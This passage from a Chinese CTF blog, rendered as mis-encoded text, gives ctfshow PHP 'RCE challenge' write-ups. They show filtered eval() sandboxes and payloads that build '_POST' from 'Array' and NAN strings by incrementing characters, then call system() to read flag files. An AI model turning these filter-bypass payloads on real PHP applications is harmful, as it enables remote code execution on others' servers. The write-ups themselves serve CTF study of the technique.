alt="image-20230224202801282"></p><p>javaæ¼æ´å°±å¤§æ¦‚äº†è§£å®Œäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¼€å§‹å»å­¦ä¹ javaååºåˆ—åŒ–ï¼Œè¾¹åšé¢˜è¾¹å­¦ä¹ javaäº†ã€‚</p><p><strong>ä»¥ä¸Šçš„é¢˜ç›®å¦‚æœè¾“å…¥envåªå‡ºæ¥åŠæˆªçš„ï¼Œå¯ä»¥å»çœ‹æˆ‘å†™çš„web297çš„é¢˜è§£</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow java åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-RCEæé™æŒ‘æˆ˜</title>
      <link href="/posts/aeb7a8fc.html"/>
      <url>/posts/aeb7a8fc.html</url>
      
        <content type="html"><![CDATA[<h2 id="RCEæŒ‘æˆ˜1"><a href="#RCEæŒ‘æˆ˜1" class="headerlink" title="RCEæŒ‘æˆ˜1"></a>RCEæŒ‘æˆ˜1</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;æ‹¬å·&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;ç‚¹&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªæ˜¯æŠŠ().ç»™è¿‡æ»¤æ‰äº†ï¼Œç›´æ¥ä½¿ç”¨ä¸å¸¦ç‚¹å’Œæ‹¬å·çš„RCEæ–¹å¼å°±å¯ä»¥äº†ï¼Œæ¯”å¦‚æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œä¸´æ—¶æ–‡ä»¶åŒ…å«</p><p>è¿˜æœ‰æ›´ç®€å•çš„</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="keyword">echo</span> `<span class="variable">$_POST</span>[<span class="number">1</span>]`;&amp;<span class="number">1</span>=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCEæŒ‘æˆ˜2"><a href="#RCEæŒ‘æˆ˜2" class="headerlink" title="RCEæŒ‘æˆ˜2"></a>RCEæŒ‘æˆ˜2</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>pythonè„šæœ¬</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·‘äº†ä¸€ä¸‹æ­£åˆ™ï¼Œæ‰å‘ç°åªæœ‰è¿™å‡ ä¸ªä¸œè¥¿èƒ½è¿›è¡Œåˆ©ç”¨</p><p><img src="../images/image-20230220195106844.png" alt="image-20230220195106844"></p><p>è¿™é“é¢˜åˆ©ç”¨çš„æ˜¯<strong>è‡ªå¢rce</strong></p><p>pç‰›ä¹‹å‰çš„æ–‡ç« ä¹Ÿå†™è¿‡è¿™ä¸ª</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p><p>æ€è·¯å°±æ˜¯ï¼Œæˆ‘ä»¬rceéœ€è¦å­—æ¯ï¼Œä½†å­—æ¯éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦æƒ³åŠæ³•å»æ„é€ å­—æ¯ï¼Œpç¥æ˜¯ç”¨</p><p>å¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸º<code>Arrayï¼Œè€Œæˆ‘ä»¬å¦‚æœå–Arrayçš„ç¬¬[0]</code>ä¸ªå­—æ¯çš„è¯å°±æ˜¯Aï¼Œè€ŒA++å°±æ˜¯B</p><p><img src="../images/37853e892a9643ac805787746756841c.png" alt="img"></p><p><strong>payload1</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=[].<span class="string">&#x27;&#x27;</span>;  //å¾—åˆ°Array</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$_</span>[<span class="string">&#x27;/&#x27;</span>==<span class="string">&#x27;+&#x27;</span>];   //è®©[]é‡Œçš„å€¼æŠ¥é”™è¿”å›0,å–Array[0]=Aï¼Œæ­¤æ—¶<span class="variable">$_</span>=A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____=<span class="string">&#x27;_&#x27;</span>;   //è®©<span class="variable">$____</span>=_ï¼Œåé¢å®¹æ˜“æ‹¼æ¥</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;   //å°†Aèµ‹ç»™<span class="variable">$__</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  //Aè‡ªå¢åˆ°Gï¼Œæ­¤æ—¶<span class="variable">$__</span>=G</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>; //å°†_å’ŒGæ‹¼æ¥èµ·æ¥ï¼Œæ­¤æ—¶<span class="variable">$____</span>=_G</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;   //å†å°†<span class="variable">$__</span>è¿˜åŸæˆA</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  //Aè‡ªå¢åˆ°E,æ­¤æ—¶__=E</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;  //Eå’Œ_Gæ‹¼æ¥ï¼Œæ­¤æ—¶<span class="variable">$____</span>ä¸º_GE</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;  //å†å°†__æ¢æºæˆA</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  //Aè‡ªå¢æˆTæ­¤æ—¶__=T</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;  //å†æ‹¼æ¥æˆ_GETï¼Œæ­¤æ—¶<span class="variable">$____</span>=_GET</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$____</span>;   //ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬æŠŠ____æ¢æˆ_</span></span><br><span class="line"><span class="meta prompt_">($</span><span class="language-bash"><span class="variable">$_</span>[_])($<span class="variable">$_</span>[__]);  //æ‹¼æˆæˆ‘ä»¬æƒ³è¦çš„(<span class="variable">$_GET</span>[_])(<span class="variable">$_GET</span>[__]),ä¼ å…¥_å’Œ__å‘½ä»¤æ‰§è¡Œå³å¯</span>  </span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=[].<span class="string">&#x27;&#x27;</span>;//Array</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____=<span class="string">&#x27;_&#x27;</span>;//_</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//P</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_P</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//O</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_PO</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//S</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_POS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>;//A</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;//T</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____.=<span class="variable">$__</span>;//_POST</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=<span class="variable">$____</span>;//_POST</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$_</span>[__]($<span class="variable">$_</span>[_]);//<span class="variable">$_POST</span>[__](<span class="variable">$_POST</span>[_]);</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºä»€ä¹ˆèƒ½ç”¨è‡ªå¢æ˜¯å› ä¸º$_æ˜¯ä¼šè®°å½•ä¸Šä¸€æ¬¡çš„å€¼</p><p><strong>æœ€ç»ˆpaylaod</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=%24%5F%3D%5B%5D%2E%27%27%3B%24%5F%3D%24%5F%5B%27%27%3D%3D%27%24%27%5D%3B%24%5F%5F%5F%5F%3D%27%5F%27%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%5F%5F%5F%5F%3B%24%24%5F%5B%5F%5F%5D%28%24%24%5F%5B%5F%5D%29%3B&amp;__=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><h2 id="RCEæŒ‘æˆ˜3"><a href="#RCEæŒ‘æˆ˜3" class="headerlink" title="RCEæŒ‘æˆ˜3"></a>RCEæŒ‘æˆ˜3</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220200800189.png" alt="image-20230220200800189"></p><p>è¿™é‡Œæ˜¯å°‘äº†ï¼â€™ å¤šäº†01</p><p>å¼€å§‹é™åˆ¶é•¿åº¦äº†ï¼Œ105å­—ç¬¦ï¼Œä½†æ˜¯å¯ä»¥ç”¨æ•°å­—0æˆ–è€…1ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡(0/0)æ¥æ„é€ floatå‹çš„NANï¼Œ(1/0)æ¥æ„é€ floatå‹çš„INFï¼Œç„¶åè½¬æ¢æˆå­—ç¬¦ä¸²å‹ï¼Œå¾—åˆ°â€NANâ€å’Œâ€INFâ€ä¸­çš„å­—ç¬¦äº†ï¼Œpayloadæ„é€ è¿‡ç¨‹ï¼Œè¿™é‡Œç›´è§‰ä¸Šè®¤ä¸ºæ„é€ <code>_GET</code>æ›´ç®€å•ï¼Œä½†æ˜¯å®é™…ä¸Šç›®å‰å¯ä»¥ç”¨çš„å­—ç¬¦å½“ä¸­ï¼Œåªæœ‰Nç¦»Tæœ€è¿‘ï¼Œè€Œä»Nå¼€å§‹è‡ªå¢æ„é€ Tçš„æ—¶å€™ï¼Œä¼šç»è¿‡OPQRSï¼Œæ‰€ä»¥å…¶å®æ„é€ <code>_GET</code> çš„åŒæ—¶ï¼Œå·²ç»æŠŠ<code>_POST</code>æ„é€ å‡ºæ¥äº†ï¼Œç›¸å½“äºç™½æ„é€ äº†<code>GE</code></p><p>è¿™é‡Œçš„è¯</p><p><img src="../images/image-20230220204020605.png" alt="image-20230220204020605"></p><p>å­—æ¯çš„è¯å¯ä»¥éšä¾¿å–ä»£ï¼Œå› ä¸ºåœ¨è¿™é‡Œçš„è¯å­—æ¯ä¼šè¢«å½“ä½œ0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NaNï¼ˆNot a Numberï¼Œéæ•°ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­æ•°å€¼æ•°æ®ç±»å‹çš„ä¸€ç±»å€¼ï¼Œè¡¨ç¤ºæœªå®šä¹‰æˆ–ä¸å¯è¡¨ç¤ºçš„å€¼ã€‚å¸¸åœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­ä½¿ç”¨ã€‚é¦–æ¬¡å¼•å…¥NaNçš„æ˜¯1985å¹´çš„IEEE 754æµ®ç‚¹æ•°æ ‡å‡†ã€‚</span><br><span class="line"></span><br><span class="line">INFï¼šinfiniteï¼Œè¡¨ç¤ºâ€œæ— ç©·å¤§â€ã€‚ è¶…å‡ºæµ®ç‚¹æ•°çš„è¡¨ç¤ºèŒƒå›´ï¼ˆæº¢å‡ºï¼Œå³é˜¶ç éƒ¨åˆ†è¶…è¿‡å…¶èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼ï¼‰ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åŸç†è¿˜æ˜¯ä¸Šä¸€é¢˜çš„è‡ªå¢ï¼Œè¯•ç€æ„é€ ä¸€ä¸‹ï¼Œå½“æˆ‘æ˜¯æƒ³ç›´æ¥$a[0]çš„æ—¶å€™ï¼Œä»–æ²¡æœ‰å›æ˜¾ï¼ŒåŸæ¥æ˜¯å› ä¸ºç°åœ¨çš„NANè¿˜ä¸ç®—å­—ç¬¦ä¸²,æ‰€ä»¥åé¢è¦åœ¨æ‹¼æ¥ä¸€ä¸ªä¾‹å¦‚</p><p><img src="../images/image-20230220204318669.png" alt="image-20230220204318669"></p><p>æ‹¼æ¥ä¸€ä¸ªå­—ç¬¦çš„è¯å°±ä¼šå˜æˆå­—ç¬¦ä¸²äº†ã€‚</p><p>ä½†æˆ‘æˆ‘ä»¬éœ€è¦å­—æ¯æ‰èƒ½æ„é€ Nï¼Œå°±ç”¨ä¸Šä¸€é¢˜åŒæ ·çš„æ–¹æ³•æ„é€ å‡ºAæ¥ï¼Œå› ä¸º0å¯ä»¥ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸ç”¨è®©æŠ¥é”™ç›´æ¥ç”¨[0]å°±å¯ä»¥äº†</p><p><img src="../images/7bbcda92852545ce97dbd2d22b130783.png" alt="img"></p><p>è¿™é‡Œèƒ½å¾—åˆ°Aæ˜¯å› ä¸º[].[]ä¼šå˜æˆArray,ç„¶åArray[0]å°±ä¼šç”ŸæˆAï¼›</p><p><strong>å’ŒRCEæŒ‘æˆ˜2æ„é€ æ–¹æ³•ä¸€æ ·</strong></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°Näº†</p><p><img src="../images/fc6729792a6c44d68b05e5e91c2b82a7.png" alt="img"></p><p>è¿™é‡Œèƒ½å¾—åˆ°Næ˜¯å› ä¸º$_ä¸ºAï¼Œç„¶åAçš„è¯ä¼šå˜æˆ0ï¼Œç„¶åå†è¿æ¥å­—ç¬¦ä¸²Aå°±å¯ä»¥äº†</p><p><code>$__=(A/A.A)[0]</code>å°±æ˜¯ä¼šå˜æˆè¿™æ ·</p><p>ä¹‹åå†è·Ÿä¸Šä¸€æ­¥ä¸€æ ·ä¸€æ­¥ä¸€æ­¥è‡ªå¢å°±å¯ä»¥äº†</p><p><strong>payload</strong>1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>];    <span class="comment">//å¾—åˆ°Array</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>)[<span class="number">0</span>];   <span class="comment">//__=N</span></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;  <span class="comment">//æ‹¼æ¥PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;  <span class="comment">//S</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">//æ‹¼æ¥POS</span></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>;  <span class="comment">//æ‹¼æ¥_å’ŒPOST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);  <span class="comment">//$_POST[0]($_POST[1])</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 